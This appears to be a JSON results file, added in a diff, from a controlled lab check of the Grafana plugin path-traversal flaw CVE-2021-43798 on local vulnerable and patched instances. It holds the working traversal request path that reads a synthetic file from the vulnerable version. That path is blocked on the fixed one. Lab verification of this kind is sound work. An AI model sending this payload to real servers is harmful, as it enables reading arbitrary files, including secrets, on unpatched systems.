@@ -1,0 +1,66 @@
+{
+  "cve": "CVE-2021-43798",
+  "checked_at": "2026-10-25T14:29:34.345032+00:00",
+  "scope": "127.0.0.1:18083/18084",
+  "environments": [
+    {
+      "name": "vulnerable",
+      "port": 18083,
+      "version": "8.3.0",
+      "health": {
+        "path": "/api/health",
+        "status": 200,
+        "body": "{\n  \"commit\": \"914fcedb72\",\n  \"database\": \"ok\",\n  \"version\": \"8.3.0\"\n}"
+      },
+      "login": {
+        "path": "/login",
+        "status": 200,
+        "body": "<!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge,chrome=1\"/><meta name=\"viewport\" content=\"width=device-width\"/><meta name=\"theme-color\" content=\"#000\"/><title>Grafana</title><base href=\"/\"/><link rel=\"preload\" href=\"public/fonts/roboto/RxZJdnzeo3R5zSexge8UUVtXRa8TVwTICgirnJhmVJw.woff2\" as=\"font\" crossorigin/><link rel=\"icon\" type=\"image/png\" href=\"public/img/fav32.png\"/><link rel=\"apple-touch-icon\" sizes=\"180x180\" href=\"public/img/apple-touch-icon.png\"/><link rel=\"mask-icon\" href=\"public/img/grafana_mask_icon.svg\" color=\"#F05A28\"/><link rel=\"stylesheet\" href=\"public/build/grafana.dark.fab5d6bbd438adca1160.css\"/><script nonce=\"\">performance.mark('frontend_boot_css_time_seconds');</script><meta name=\"apple-mobile-web-app-capable\" content=\"yes\"/><meta name=\"apple-mobile-web-app-status-bar-style\" content=\"black\"/><meta name=\"msapplication-TileColor\" content=\"#2b5797\"/><meta name=\"msapplication-config\" content=\"public/img/browserconfig.xml\"/></head><body class=\"theme-dark app-grafana\"><style>.preloader {\n        height: 100%;\n        flex-direction: column;\n        display: flex;\n        justify-content: center;\n        align-items: center;\n      }\n\n      .preloader__enter {\n        opacity: 0;\n        animation-name: preloader-fade-in;\n        animation-iteration-count: 1;\n        animation-duration: 0.9s;\n        animation-delay: 1.35s;\n        animation-fill-mode: forwards;\n      }\n\n      .preloader__bounce {\n        text-align: center;\n        animation-name: preloader-bounce;\n        animation-duration: 0.9s;\n        animation-iteration-count: infinite;\n      }\n\n      .preloader__logo {\n        display: inline-block;\n        animation-name: preloader-squash;\n        animation-duration: 0.9s;\n        animation-iteration-count: infinite;\n        width: 60px;\n        height: 60px;\n        background-repeat: no-repeat;\n        background-size: contain;\n        background-image: url('public/img/grafana_icon.svg');\n      }\n\n      .preloader__text {\n        margin-top: 16px;\n        font-weight: 500;\n        font-size: 14px;\n        font-family: Sans-serif;\n        opacity: 0;\n        animation-name: preloader-fade-in;\n        animation-duration: 0.9s;\n        animation-delay: 1.8s;\n        animation-fill-mode: forwards;\n      }\n\n      .theme-light .preloader__text {\n        color: #52545c;\n      }\n\n      .theme-dark .preloader__text {\n        color: #d8d9da;\n      }\n\n      @keyframes preloader-fade-in {\n        0% {\n          opacity: 0;\n           \n          animation-timing-function: cubic-bezier(0, 0, 0.5, 1);\n        }\n        100% {\n          opacity: 1;\n        }\n      }\n\n      @keyframes preloader-bounce {\n        from,\n        to {\n          transform: translateY(0px);\n          animation-timing-function: cubic-bezier(0.3, 0, 0.1, 1);\n        }\n        50% {\n          transform: translateY(-50px);\n          animation-timing-function: cubic-bezier(0.9, 0, 0.7, 1);\n        }\n      }\n\n      @keyframes preloader-squash {\n        0% {\n          transform: scaleX(1.3) scaleY(0.8);\n          animation-timing-function: cubic-bezier(0.3, 0, 0.1, 1);\n          transform-origin: bottom center;\n        }\n        15% {\n          transform: scaleX(0.75) scaleY(1.25);\n          animation-timing-function: cubic-bezier(0, 0, 0.7, 0.75);\n          transform-origin: bottom center;\n        }\n        55% {\n          transform: scaleX(1.05) scaleY(0.95);\n          animation-timing-function: cubic-bezier(0.9, 0, 1, 1);\n          transform-origin: top center;\n        }\n        95% {\n          transform: scaleX(0.75) scaleY(1.25);\n          animation-timing-function: cubic-bezier(0, 0, 0, 1);\n          transform-origin: bottom center;\n        }\n        100% {\n          transform: scaleX(1.3) scaleY(0.8);\n          transform-origin: bottom center;\n          animation-timing-function: cubic-bezier(0, 0, 0.7, 1);\n        }\n      }\n\n       \n      .preloader__text--fail {\n        display: none;\n      }\n\n       \n      .preloader--done .preloader__bounce,\n      .preloader--done .preloader__logo {\n        animation-name: none;\n        display: none;\n      }\n\n      .preloader--done .preloader__logo,\n      .preloader--done .preloader__text {\n        display: none;\n        color: #ff5705 !important;\n        font-size: 15px;\n      }\n\n      .preloader--done .preloader__text--fail {\n        display: block;\n      }\n\n      [ng\\:cloak],\n      [ng-cloak],\n      .ng-cloak {\n        display: none !important;\n      }</style><div class=\"preloader\"><div class=\"preloader__enter\"><div class=\"preloader__bounce\"><div class=\"preloader__logo\"></div></div></div><div class=\"preloader__text\">Loading Grafana</div><div class=\"preloader__text preloader__text--fail\"><p><strong>If you're seeing this Grafana has failed to load its application files</strong><br/><br/></p><p>1. This could be caused by your reverse proxy settings.<br/><br/>2. If you host grafana under subpath make sure your grafana.ini root"
+      },
+      "traversal": {
+        "path": "/public/plugins/alertlist/../../../../../../../../../../../../tmp/lab2-proof.txt",
+        "status": 200,
+        "body": "LAB2-CVE-2021-43798-CONTROLLED-FILE\nSynthetic training evidence, contains no personal data or secrets.\n"
+      },
+      "missing": {
+        "path": "/public/plugins/alertlist/../../../../../../../../../../../../tmp/lab2-nonexistent.txt",
+        "status": 404,
+        "body": "{\n  \"message\": \"Plugin file not found\"\n}\n"
+      }
+    },
+    {
+      "name": "fixed",
+      "port": 18084,
+      "version": "8.3.1",
+      "health": {
+        "path": "/api/health",
+        "status": 200,
+        "body": "{\n  \"commit\": \"b9eacd93e9\",\n  \"database\": \"ok\",\n  \"version\": \"8.3.1\"\n}"
+      },
+      "login": {
+        "path": "/login",
+        "status": 200,
+        "body": "<!doctype html><html lang=\"en\"><head><meta charset=\"utf-8\"/><meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge,chrome=1\"/><meta name=\"viewport\" content=\"width=device-width\"/><meta name=\"theme-color\" content=\"#000\"/><title>Grafana</title><base href=\"/\"/><link rel=\"preload\" href=\"public/fonts/roboto/RxZJdnzeo3R5zSexge8UUVtXRa8TVwTICgirnJhmVJw.woff2\" as=\"font\" crossorigin/><link rel=\"icon\" type=\"image/png\" href=\"public/img/fav32.png\"/><link rel=\"apple-touch-icon\" sizes=\"180x180\" href=\"public/img/apple-touch-icon.png\"/><link rel=\"mask-icon\" href=\"public/img/grafana_mask_icon.svg\" color=\"#F05A28\"/><link rel=\"stylesheet\" href=\"public/build/grafana.dark.fab5d6bbd438adca1160.css\"/><script nonce=\"\">performance.mark('frontend_boot_css_time_seconds');</script><meta name=\"apple-mobile-web-app-capable\" content=\"yes\"/><meta name=\"apple-mobile-web-app-status-bar-style\" content=\"black\"/><meta name=\"msapplication-TileColor\" content=\"#2b5797\"/><meta name=\"msapplication-config\" content=\"public/img/browserconfig.xml\"/></head><body class=\"theme-dark app-grafana\"><style>.preloader {\n        height: 100%;\n        flex-direction: column;\n        display: flex;\n        justify-content: center;\n        align-items: center;\n      }\n\n      .preloader__enter {\n        opacity: 0;\n        animation-name: preloader-fade-in;\n        animation-iteration-count: 1;\n        animation-duration: 0.9s;\n        animation-delay: 1.35s;\n        animation-fill-mode: forwards;\n      }\n\n      .preloader__bounce {\n        text-align: center;\n        animation-name: preloader-bounce;\n        animation-duration: 0.9s;\n        animation-iteration-count: infinite;\n      }\n\n      .preloader__logo {\n        display: inline-block;\n        animation-name: preloader-squash;\n        animation-duration: 0.9s;\n        animation-iteration-count: infinite;\n        width: 60px;\n        height: 60px;\n        background-repeat: no-repeat;\n        background-size: contain;\n        background-image: url('public/img/grafana_icon.svg');\n      }\n\n      .preloader__text {\n        margin-top: 16px;\n        font-weight: 500;\n        font-size: 14px;\n        font-family: Sans-serif;\n        opacity: 0;\n        animation-name: preloader-fade-in;\n        animation-duration: 0.9s;\n        animation-delay: 1.8s;\n        animation-fill-mode: forwards;\n      }\n\n      .theme-light .preloader__text {\n        color: #52545c;\n      }\n\n      .theme-dark .preloader__text {\n        color: #d8d9da;\n      }\n\n      @keyframes preloader-fade-in {\n        0% {\n          opacity: 0;\n           \n          animation-timing-function: cubic-bezier(0, 0, 0.5, 1);\n        }\n        100% {\n          opacity: 1;\n        }\n      }\n\n      @keyframes preloader-bounce {\n        from,\n        to {\n          transform: translateY(0px);\n          animation-timing-function: cubic-bezier(0.3, 0, 0.1, 1);\n        }\n        50% {\n          transform: translateY(-50px);\n          animation-timing-function: cubic-bezier(0.9, 0, 0.7, 1);\n        }\n      }\n\n      @keyframes preloader-squash {\n        0% {\n          transform: scaleX(1.3) scaleY(0.8);\n          animation-timing-function: cubic-bezier(0.3, 0, 0.1, 1);\n          transform-origin: bottom center;\n        }\n        15% {\n          transform: scaleX(0.75) scaleY(1.25);\n          animation-timing-function: cubic-bezier(0, 0, 0.7, 0.75);\n          transform-origin: bottom center;\n        }\n        55% {\n          transform: scaleX(1.05) scaleY(0.95);\n          animation-timing-function: cubic-bezier(0.9, 0, 1, 1);\n          transform-origin: top center;\n        }\n        95% {\n          transform: scaleX(0.75) scaleY(1.25);\n          animation-timing-function: cubic-bezier(0, 0, 0, 1);\n          transform-origin: bottom center;\n        }\n        100% {\n          transform: scaleX(1.3) scaleY(0.8);\n          transform-origin: bottom center;\n          animation-timing-function: cubic-bezier(0, 0, 0.7, 1);\n        }\n      }\n\n       \n      .preloader__text--fail {\n        display: none;\n      }\n\n       \n      .preloader--done .preloader__bounce,\n      .preloader--done .preloader__logo {\n        animation-name: none;\n        display: none;\n      }\n\n      .preloader--done .preloader__logo,\n      .preloader--done .preloader__text {\n        display: none;\n        color: #ff5705 !important;\n        font-size: 15px;\n      }\n\n      .preloader--done .preloader__text--fail {\n        display: block;\n      }\n\n      [ng\\:cloak],\n      [ng-cloak],\n      .ng-cloak {\n        display: none !important;\n      }</style><div class=\"preloader\"><div class=\"preloader__enter\"><div class=\"preloader__bounce\"><div class=\"preloader__logo\"></div></div></div><div class=\"preloader__text\">Loading Grafana</div><div class=\"preloader__text preloader__text--fail\"><p><strong>If you're seeing this Grafana has failed to load its application files</strong><br/><br/></p><p>1. This could be caused by your reverse proxy settings.<br/><br/>2. If you host grafana under subpath make sure your grafana.ini root"
+      },
+      "traversal": {
+        "path": "/public/plugins/alertlist/../../../../../../../../../../../../tmp/lab2-proof.txt",
+        "status": 404,
+        "body": "{\n  \"message\": \"Plugin file not found\"\n}\n"
+      },
+      "missing": {
+        "path": "/public/plugins/alertlist/../../../../../../../../../../../../tmp/lab2-nonexistent.txt",
+        "status": 404,
+        "body": "{\n  \"message\": \"Plugin file not found\"\n}\n"
+      }
+    }
+  ],
+  "checks": {
+    "versions_match": true,
+    "vulnerable_file_read": true,
+    "fixed_file_read_blocked": true,
+    "missing_file_not_leaked": true,
+    "login_works_both": true,
+    "health_works_both": true
+  },
+  "all_passed": true
+}
